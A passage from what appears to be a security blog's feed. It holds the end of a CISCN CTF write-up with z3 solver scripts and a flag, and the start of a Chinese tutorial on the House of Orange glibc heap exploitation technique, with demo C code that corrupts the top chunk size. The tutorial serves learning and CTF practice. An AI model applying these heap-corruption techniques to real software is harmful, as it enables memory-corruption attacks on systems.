class="number">2</span>]+<span class="number">68</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">7</span>]==<span class="number">34</span>*v5[<span class="number">10</span>]+<span class="number">12</span>*v5[<span class="number">7</span>]+<span class="number">53</span>*v5[<span class="number">8</span>]+<span class="number">6</span>*v5[<span class="number">9</span>]+<span class="number">58</span>*v5[<span class="number">11</span>]+<span class="number">36</span>*v5[<span class="number">12</span>]+v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">8</span>]==<span class="number">27</span>*v5[<span class="number">11</span>]+<span class="number">73</span>*v5[<span class="number">10</span>]+<span class="number">12</span>*v5[<span class="number">9</span>]+<span class="number">83</span>*v5[<span class="number">7</span>]+<span class="number">85</span>*v5[<span class="number">8</span>]+<span class="number">96</span>*v5[<span class="number">12</span>]+<span class="number">52</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">9</span>]==<span class="number">24</span>*v5[<span class="number">9</span>]+<span class="number">78</span>*v5[<span class="number">7</span>]+<span class="number">53</span>*v5[<span class="number">8</span>]+<span class="number">36</span>*v5[<span class="number">10</span>]+<span class="number">86</span>*v5[<span class="number">11</span>]+<span class="number">25</span>*v5[<span class="number">12</span>]+<span class="number">46</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">10</span>]==<span class="number">78</span>*v5[<span class="number">8</span>]+<span class="number">39</span>*v5[<span class="number">7</span>]+<span class="number">52</span>*v5[<span class="number">9</span>]+<span class="number">9</span>*v5[<span class="number">10</span>]+<span class="number">62</span>*v5[<span class="number">11</span>]+<span class="number">37</span>*v5[<span class="number">12</span>]+<span class="number">84</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">11</span>]==<span class="number">48</span>*v5[<span class="number">11</span>]+<span class="number">14</span>*v5[<span class="number">9</span>]+<span class="number">23</span>*v5[<span class="number">7</span>]+<span class="number">6</span>*v5[<span class="number">8</span>]+<span class="number">74</span>*v5[<span class="number">10</span>]+<span class="number">12</span>*v5[<span class="number">12</span>]+<span class="number">83</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">12</span>]==<span class="number">15</span>*v5[<span class="number">12</span>]+<span class="number">48</span>*v5[<span class="number">11</span>]+<span class="number">92</span>*v5[<span class="number">9</span>]+<span class="number">85</span>*v5[<span class="number">8</span>]+<span class="number">27</span>*v5[<span class="number">7</span>]+<span class="number">42</span>*v5[<span class="number">10</span>]+<span class="number">72</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">13</span>]==<span class="number">26</span>*v5[<span class="number">12</span>]+<span class="number">67</span>*v5[<span class="number">10</span>]+<span class="number">6</span>*v5[<span class="number">8</span>]+<span class="number">4</span>*v5[<span class="number">7</span>]+<span class="number">3</span>*v5[<span class="number">9</span>]+<span class="number">68</span>*v5[<span class="number">13</span>])</span><br><span class="line">s.add(v4[<span class="number">14</span>]==<span class="number">34</span>*v5[<span class="number">17</span>]+<span class="number">12</span>*v5[<span class="number">14</span>]+<span class="number">53</span>*v5[<span class="number">15</span>]+<span class="number">6</span>*v5[<span class="number">16</span>]+<span class="number">58</span>*v5[<span class="number">18</span>]+<span class="number">36</span>*v5[<span class="number">19</span>]+v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">15</span>]==<span class="number">27</span>*v5[<span class="number">18</span>]+<span class="number">73</span>*v5[<span class="number">17</span>]+<span class="number">12</span>*v5[<span class="number">16</span>]+<span class="number">83</span>*v5[<span class="number">14</span>]+<span class="number">85</span>*v5[<span class="number">15</span>]+<span class="number">96</span>*v5[<span class="number">19</span>]+<span class="number">52</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">16</span>]==<span class="number">24</span>*v5[<span class="number">16</span>]+<span class="number">78</span>*v5[<span class="number">14</span>]+<span class="number">53</span>*v5[<span class="number">15</span>]+<span class="number">36</span>*v5[<span class="number">17</span>]+<span class="number">86</span>*v5[<span class="number">18</span>]+<span class="number">25</span>*v5[<span class="number">19</span>]+<span class="number">46</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">17</span>]==<span class="number">78</span>*v5[<span class="number">15</span>]+<span class="number">39</span>*v5[<span class="number">14</span>]+<span class="number">52</span>*v5[<span class="number">16</span>]+<span class="number">9</span>*v5[<span class="number">17</span>]+<span class="number">62</span>*v5[<span class="number">18</span>]+<span class="number">37</span>*v5[<span class="number">19</span>]+<span class="number">84</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">18</span>]==<span class="number">48</span>*v5[<span class="number">18</span>]+<span class="number">14</span>*v5[<span class="number">16</span>]+<span class="number">23</span>*v5[<span class="number">14</span>]+<span class="number">6</span>*v5[<span class="number">15</span>]+<span class="number">74</span>*v5[<span class="number">17</span>]+<span class="number">12</span>*v5[<span class="number">19</span>]+<span class="number">83</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">19</span>]==<span class="number">15</span>*v5[<span class="number">19</span>]+<span class="number">48</span>*v5[<span class="number">18</span>]+<span class="number">92</span>*v5[<span class="number">16</span>]+<span class="number">85</span>*v5[<span class="number">15</span>]+<span class="number">27</span>*v5[<span class="number">14</span>]+<span class="number">42</span>*v5[<span class="number">17</span>]+<span class="number">72</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">20</span>]==<span class="number">26</span>*v5[<span class="number">19</span>]+<span class="number">67</span>*v5[<span class="number">17</span>]+<span class="number">6</span>*v5[<span class="number">15</span>]+<span class="number">4</span>*v5[<span class="number">14</span>]+<span class="number">3</span>*v5[<span class="number">16</span>]+<span class="number">68</span>*v5[<span class="number">20</span>])</span><br><span class="line">s.add(v4[<span class="number">21</span>]==<span class="number">34</span>*v5[<span class="number">24</span>]+<span class="number">12</span>*v5[<span class="number">21</span>]+<span class="number">53</span>*v5[<span class="number">22</span>]+<span class="number">6</span>*v5[<span class="number">23</span>]+<span class="number">58</span>*v5[<span class="number">25</span>]+<span class="number">36</span>*v5[<span class="number">26</span>]+v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">22</span>]==<span class="number">27</span>*v5[<span class="number">25</span>]+<span class="number">73</span>*v5[<span class="number">24</span>]+<span class="number">12</span>*v5[<span class="number">23</span>]+<span class="number">83</span>*v5[<span class="number">21</span>]+<span class="number">85</span>*v5[<span class="number">22</span>]+<span class="number">96</span>*v5[<span class="number">26</span>]+<span class="number">52</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">23</span>]==<span class="number">24</span>*v5[<span class="number">23</span>]+<span class="number">78</span>*v5[<span class="number">21</span>]+<span class="number">53</span>*v5[<span class="number">22</span>]+<span class="number">36</span>*v5[<span class="number">24</span>]+<span class="number">86</span>*v5[<span class="number">25</span>]+<span class="number">25</span>*v5[<span class="number">26</span>]+<span class="number">46</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">24</span>]==<span class="number">78</span>*v5[<span class="number">22</span>]+<span class="number">39</span>*v5[<span class="number">21</span>]+<span class="number">52</span>*v5[<span class="number">23</span>]+<span class="number">9</span>*v5[<span class="number">24</span>]+<span class="number">62</span>*v5[<span class="number">25</span>]+<span class="number">37</span>*v5[<span class="number">26</span>]+<span class="number">84</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">25</span>]==<span class="number">48</span>*v5[<span class="number">25</span>]+<span class="number">14</span>*v5[<span class="number">23</span>]+<span class="number">23</span>*v5[<span class="number">21</span>]+<span class="number">6</span>*v5[<span class="number">22</span>]+<span class="number">74</span>*v5[<span class="number">24</span>]+<span class="number">12</span>*v5[<span class="number">26</span>]+<span class="number">83</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">26</span>]==<span class="number">15</span>*v5[<span class="number">26</span>]+<span class="number">48</span>*v5[<span class="number">25</span>]+<span class="number">92</span>*v5[<span class="number">23</span>]+<span class="number">85</span>*v5[<span class="number">22</span>]+<span class="number">27</span>*v5[<span class="number">21</span>]+<span class="number">42</span>*v5[<span class="number">24</span>]+<span class="number">72</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">27</span>]==<span class="number">26</span>*v5[<span class="number">26</span>]+<span class="number">67</span>*v5[<span class="number">24</span>]+<span class="number">6</span>*v5[<span class="number">22</span>]+<span class="number">4</span>*v5[<span class="number">21</span>]+<span class="number">3</span>*v5[<span class="number">23</span>]+<span class="number">68</span>*v5[<span class="number">27</span>])</span><br><span class="line">s.add(v4[<span class="number">28</span>]==<span class="number">34</span>*v5[<span class="number">31</span>]+<span class="number">12</span>*v5[<span class="number">28</span>]+<span class="number">53</span>*v5[<span class="number">29</span>]+<span class="number">6</span>*v5[<span class="number">30</span>]+<span class="number">58</span>*v5[<span class="number">32</span>]+<span class="number">36</span>*v5[<span class="number">33</span>]+v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">29</span>]==<span class="number">27</span>*v5[<span class="number">32</span>]+<span class="number">73</span>*v5[<span class="number">31</span>]+<span class="number">12</span>*v5[<span class="number">30</span>]+<span class="number">83</span>*v5[<span class="number">28</span>]+<span class="number">85</span>*v5[<span class="number">29</span>]+<span class="number">96</span>*v5[<span class="number">33</span>]+<span class="number">52</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">30</span>]==<span class="number">24</span>*v5[<span class="number">30</span>]+<span class="number">78</span>*v5[<span class="number">28</span>]+<span class="number">53</span>*v5[<span class="number">29</span>]+<span class="number">36</span>*v5[<span class="number">31</span>]+<span class="number">86</span>*v5[<span class="number">32</span>]+<span class="number">25</span>*v5[<span class="number">33</span>]+<span class="number">46</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">31</span>]==<span class="number">78</span>*v5[<span class="number">29</span>]+<span class="number">39</span>*v5[<span class="number">28</span>]+<span class="number">52</span>*v5[<span class="number">30</span>]+<span class="number">9</span>*v5[<span class="number">31</span>]+<span class="number">62</span>*v5[<span class="number">32</span>]+<span class="number">37</span>*v5[<span class="number">33</span>]+<span class="number">84</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">32</span>]==<span class="number">48</span>*v5[<span class="number">32</span>]+<span class="number">14</span>*v5[<span class="number">30</span>]+<span class="number">23</span>*v5[<span class="number">28</span>]+<span class="number">6</span>*v5[<span class="number">29</span>]+<span class="number">74</span>*v5[<span class="number">31</span>]+<span class="number">12</span>*v5[<span class="number">33</span>]+<span class="number">83</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">33</span>]==<span class="number">15</span>*v5[<span class="number">33</span>]+<span class="number">48</span>*v5[<span class="number">32</span>]+<span class="number">92</span>*v5[<span class="number">30</span>]+<span class="number">85</span>*v5[<span class="number">29</span>]+<span class="number">27</span>*v5[<span class="number">28</span>]+<span class="number">42</span>*v5[<span class="number">31</span>]+<span class="number">72</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">34</span>]==<span class="number">26</span>*v5[<span class="number">33</span>]+<span class="number">67</span>*v5[<span class="number">31</span>]+<span class="number">6</span>*v5[<span class="number">29</span>]+<span class="number">4</span>*v5[<span class="number">28</span>]+<span class="number">3</span>*v5[<span class="number">30</span>]+<span class="number">68</span>*v5[<span class="number">34</span>])</span><br><span class="line">s.add(v4[<span class="number">35</span>]==<span class="number">34</span>*v5[<span class="number">38</span>]+<span class="number">12</span>*v5[<span class="number">35</span>]+<span class="number">53</span>*v5[<span class="number">36</span>]+<span class="number">6</span>*v5[<span class="number">37</span>]+<span class="number">58</span>*v5[<span class="number">39</span>]+<span class="number">36</span>*v5[<span class="number">40</span>]+v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">36</span>]==<span class="number">27</span>*v5[<span class="number">39</span>]+<span class="number">73</span>*v5[<span class="number">38</span>]+<span class="number">12</span>*v5[<span class="number">37</span>]+<span class="number">83</span>*v5[<span class="number">35</span>]+<span class="number">85</span>*v5[<span class="number">36</span>]+<span class="number">96</span>*v5[<span class="number">40</span>]+<span class="number">52</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">37</span>]==<span class="number">24</span>*v5[<span class="number">37</span>]+<span class="number">78</span>*v5[<span class="number">35</span>]+<span class="number">53</span>*v5[<span class="number">36</span>]+<span class="number">36</span>*v5[<span class="number">38</span>]+<span class="number">86</span>*v5[<span class="number">39</span>]+<span class="number">25</span>*v5[<span class="number">40</span>]+<span class="number">46</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">38</span>]==<span class="number">78</span>*v5[<span class="number">36</span>]+<span class="number">39</span>*v5[<span class="number">35</span>]+<span class="number">52</span>*v5[<span class="number">37</span>]+<span class="number">9</span>*v5[<span class="number">38</span>]+<span class="number">62</span>*v5[<span class="number">39</span>]+<span class="number">37</span>*v5[<span class="number">40</span>]+<span class="number">84</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">39</span>]==<span class="number">48</span>*v5[<span class="number">39</span>]+<span class="number">14</span>*v5[<span class="number">37</span>]+<span class="number">23</span>*v5[<span class="number">35</span>]+<span class="number">6</span>*v5[<span class="number">36</span>]+<span class="number">74</span>*v5[<span class="number">38</span>]+<span class="number">12</span>*v5[<span class="number">40</span>]+<span class="number">83</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">40</span>]==<span class="number">15</span>*v5[<span class="number">40</span>]+<span class="number">48</span>*v5[<span class="number">39</span>]+<span class="number">92</span>*v5[<span class="number">37</span>]+<span class="number">85</span>*v5[<span class="number">36</span>]+<span class="number">27</span>*v5[<span class="number">35</span>]+<span class="number">42</span>*v5[<span class="number">38</span>]+<span class="number">72</span>*v5[<span class="number">41</span>])</span><br><span class="line">s.add(v4[<span class="number">41</span>]==<span class="number">26</span>*v5[<span class="number">40</span>]+<span class="number">67</span>*v5[<span class="number">38</span>]+<span class="number">6</span>*v5[<span class="number">36</span>]+<span class="number">4</span>*v5[<span class="number">35</span>]+<span class="number">3</span>*v5[<span class="number">37</span>]+<span class="number">68</span>*v5[<span class="number">41</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">        res += <span class="built_in">chr</span>(m[v5[i]].as_long())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="oplog"><a href="#oplog" class="headerlink" title="oplog"></a>oplog</h3><p>丢进反编译器里, 看到smc</p><p>取code[0x20:]重新反编译看到正常solidity代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">r1 = Int(<span class="string">&#x27;r1&#x27;</span>)</span><br><span class="line">r2 = Int(<span class="string">&#x27;r2&#x27;</span>)</span><br><span class="line">r3 = Int(<span class="string">&#x27;r3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m1 = <span class="number">0x88c218df8c5c25674af5808d963bfee9</span></span><br><span class="line">m2 = <span class="number">0xfa8cca1bced017e0ab064d4844c3020b</span></span><br><span class="line">m3 = <span class="number">0xe0ac283049469716cebd61a5b97b8bef</span></span><br><span class="line">s.add(r1 &gt; <span class="number">0</span>)</span><br><span class="line">s.add(r2 &gt; <span class="number">0</span>)</span><br><span class="line">s.add(r3 &gt; <span class="number">0</span>)</span><br><span class="line">s.add(r1 &lt; m1)</span><br><span class="line">s.add(r2 &lt; m2)</span><br><span class="line">s.add(r3 &lt; m3)</span><br><span class="line"></span><br><span class="line">x1 = r1 * <span class="number">0xd062</span> + r2 * <span class="number">0x37b9</span> + r3 * <span class="number">0xcc13</span></span><br><span class="line"></span><br><span class="line">x2 = r1 * <span class="number">0xa4fb</span> + r2 * <span class="number">0xa0a5</span> + r3 * <span class="number">0x2fca</span></span><br><span class="line"></span><br><span class="line">x3 = r1 * <span class="number">0x8f9b</span> + r2 * <span class="number">0x9805</span> + r3 * <span class="number">0xa6a0</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">0x800000000000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">v1 = <span class="number">2357997788534811140333166336809177915724020</span></span><br><span class="line">v2 = <span class="number">94024083436562980853861433269689272115769</span></span><br><span class="line">v3 = <span class="number">7686765725723381031146546660250331403246417</span></span><br><span class="line"></span><br><span class="line">key = (<span class="number">14678491206170330851881690558556870568208252</span> % mod) ^ v1</span><br><span class="line"></span><br><span class="line">s.add((v1 ^ key) == (x1 % mod))</span><br><span class="line">s.add((v2 ^ key) == (x2 % mod))</span><br><span class="line">s.add((v3 ^ key) == (x3 % mod))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> s.check() == sat</span><br><span class="line"></span><br><span class="line">r1 = s.model()[r1].as_long()</span><br><span class="line">r2 = s.model()[r2].as_long()</span><br><span class="line">r3 = s.model()[r3].as_long()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == b:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    x, y, q = egcd(b, a % b)</span><br><span class="line">    x, y = y, (x - a // b * y)</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span>(<span class="params">pairs</span>):</span></span><br><span class="line">    mod_list, remainder_list = [p[<span class="number">0</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs], [p[<span class="number">1</span>] <span class="keyword">for</span> p <span class="keyword">in</span> pairs]</span><br><span class="line">    mod_product = reduce(<span class="keyword">lambda</span> x, y: x * y, mod_list)</span><br><span class="line">    mi_list = [mod_product//x <span class="keyword">for</span> x <span class="keyword">in</span> mod_list]</span><br><span class="line">    mi_inverse = [egcd(mi_list[i], mod_list[i])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mi_list))]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(remainder_list)):</span><br><span class="line">        x += mi_list[i] * mi_inverse[i] * remainder_list[i]</span><br><span class="line">        x %= mod_product</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">val = chinese_remainder([(m1, r1), (m2, r2), (m3, r3)])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(val)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><p>flag: <code>flag&#123;wuhan_v3r9_g009_s4y_w3jj_8&#125;</code></p>]]></content>
    
    
    <summary type="html">CISCN 初赛 Write up</summary>
    
    
    
    <category term="CTF" scheme="http://lantern.cool/categories/CTF/"/>
    
    
    <category term="Write up" scheme="http://lantern.cool/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>House of Orange</title>
    <link href="http://lantern.cool/note-pwn-house-of-orange/"/>
    <id>http://lantern.cool/note-pwn-house-of-orange/</id>
    <published>2020-08-24T11:32:36.000Z</published>
    <updated>2020-08-24T11:32:38.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文学习自CTF-Wiki的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/">House of Orange</a>, 根据学习情况略有补充和修改</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>House of Orange 与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。由于这种利用方法在此前的 CTF 题目中没有出现过，因此之后出现的一系列衍生题目的利用方法我们称之为 House of Orange</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是题目中<strong>不存在 free 函数或其他释放堆块的函数</strong>。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是<strong>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中</strong>，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 <code>malloc</code> 的分配需求。 首先我们在程序中的malloc调用会执行到 libc.so 的 <code>_int_malloc</code> 函数中，在<code>_int_malloc</code> 函数中，会依次检验 <code>fastbin</code>、<code>small bins</code>、<code>unsorted bin</code>、<code>large bins</code> 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来 <code>_int_malloc</code> 函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于 <code>mmp_.mmap_threshold</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在 <code>_int_malloc()</code> 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size +<br>MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>这里给出了一个示例程序，程序模拟了一个溢出覆盖到 top chunk 的 size 域。我们试图把 size 改小从而实现 brk 扩展，并把原有的 top chunk 放入 unsorted bin 中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size; <span class="comment">// overwrite top chunk size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们把 top chunk 的 size 覆盖为 0x41。之后申请大于这个尺寸的堆块，即 0x60。 但是当我们执行这个示例时会发现，这个程序并不能利用成功，原因在于 assert 并没有被满足从而抛出了异常</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[#0] 0x7ffff7a42428 → Name: __GI_raise(sig=0x6)</span><br><span class="line">[#1] 0x7ffff7a4402a → Name: __GI_abort()</span><br><span class="line">[#2] 0x7ffff7a8a2e8 → Name: __malloc_assert(assertion=0x7ffff7b9e150 &quot;(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&quot;, file=0x7ffff7b9ab85 &quot;malloc.c&quot;, line=0x95a, function=0x7ffff7b9e998 &lt;__func__.11509&gt; &quot;sysmalloc&quot;)</span><br><span class="line">[#3] 0x7ffff7a8e426 → Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20 &lt;main_arena&gt;)</span><br></pre></td></tr></table></figure><h2 id="正确示例"><a href="#正确示例" class="headerlink" title="正确示例"></a>正确示例</h2><p>我们回头来看一下 assert 的条件，可以发现之前列出的条目都被满足了除了第一条。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.伪造的size必须要对齐到内存页</span><br></pre></td></tr></table></figure><p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x1fe1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行分配之后我们可以观察到原来的堆经过了 brk 扩展</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//原有的堆</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line"></span><br><span 